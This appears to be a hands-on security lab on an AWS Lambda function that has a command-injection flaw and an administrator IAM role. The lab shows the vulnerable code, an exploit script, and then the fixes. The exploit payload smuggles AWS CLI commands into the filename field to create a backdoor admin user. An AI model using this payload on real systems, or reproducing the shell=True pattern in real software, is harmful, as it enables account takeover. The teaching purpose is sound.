# 06 - Hands-On Lab: Vulnerable Lambda & Remediation

In this lab, we will analyze a vulnerable AWS Lambda function, exploit it to demonstrate the blast radius of an overly permissive IAM role, and then apply least privilege remediation.

## 🛑 Scenario Overview

We have an AWS Serverless Application Model (SAM) deployment containing a `BackupFunction`. This function takes a filename via an API Gateway trigger and runs an OS command to compress it.

### The Vulnerable Infrastructure (template.yaml)
```yaml
Resources:
  BackupFunction:
    Type: AWS::Serverless::Function
    Properties:
      Handler: app.handler
      Runtime: python3.9
      # BAD: Overly permissive IAM role attached to the function
      Policies:
        - AdministratorAccess 
      Events:
        ApiEvent:
          Type: Api
          Properties:
            Path: /backup
            Method: post
```

### The Vulnerable Code (app.py)
```python
import json
import subprocess
import os

def handler(event, context):
    body = json.loads(event.get('body', '{}'))
    filename = body.get('filename')
    
    if not filename:
        return {"statusCode": 400, "body": "Filename required"}
        
    # VULNERABLE: Command Injection
    # Attacker controls the 'filename' input and it is concatenated into a shell command
    command = f"tar -czvf /tmp/backup.tar.gz /tmp/{filename}"
    
    try:
        # shell=True executes the command in a shell, allowing operators like ';' or '&&'
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return {
            "statusCode": 200,
            "body": json.dumps({"output": output.decode('utf-8')})
        }
    except subprocess.CalledProcessError as e:
        return {
            "statusCode": 500,
            "body": e.output.decode('utf-8')
        }
```

## ⚔️ The Attack

An attacker can exploit the command injection vulnerability to execute arbitrary code. Because the Lambda function has the `AdministratorAccess` policy, the attacker can leverage the AWS CLI (which is pre-installed in Python Lambda environments) to compromise the entire AWS account.

### Exploit Script (exploit.py)
```python
import requests
import json

API_URL = "https://xxxxxx.execute-api.us-east-1.amazonaws.com/Prod/backup"

# Payload: Close the tar command with a semicolon, then run aws sts get-caller-identity
# Since the function has AdministratorAccess, we can do anything. Let's create an admin user!
payload = {
    "filename": "dummy.txt; aws iam create-user --user-name h4x0r; aws iam attach-user-policy --user-name h4x0r --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
}

response = requests.post(API_URL, json=payload)
print("Response Status:", response.status_code)
print("Response Body:\n", response.text)
```
*Executing this script exploits the command injection and uses the function's administrative permissions to create a backdoor IAM admin user.*

## 🛠️ The Remediation

We need to fix two critical flaws: the Application vulnerability (Command Injection) and the Infrastructure vulnerability (Overly Permissive IAM).

### 1. Fix the Code (app.py)
Remove `shell=True` and pass arguments as a list.

```python
import json
import subprocess
import os
import re

def handler(event, context):
    body = json.loads(event.get('body', '{}'))
    filename = body.get('filename')
    
    # Input Validation
    if not filename or not re.match(r'^[\w\-\.]+$', filename):
        return {"statusCode": 400, "body": "Invalid filename"}
        
    # SECURE: Pass arguments as a list. No shell=True.
    command = ["tar", "-czvf", "/tmp/backup.tar.gz", f"/tmp/{filename}"]
    
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT)
        return {"statusCode": 200, "body": "Backup successful"}
    except subprocess.CalledProcessError as e:
        return {"statusCode": 500, "body": "Backup failed"}
```

### 2. Fix the Infrastructure (template.yaml)
Apply the Principle of Least Privilege. If this function only needs to write the backup file to a specific S3 bucket, grant it *only* that permission.

```yaml
Resources:
  BackupFunction:
    Type: AWS::Serverless::Function
    Properties:
      Handler: app.handler
      Runtime: python3.9
      # SECURE: Granular least privilege policy
      Policies:
        - S3WritePolicy:
            BucketName: !Ref MySecureBackupBucket
      Events:
        ApiEvent:
          Type: Api
          Properties:
            Path: /backup
            Method: post
```
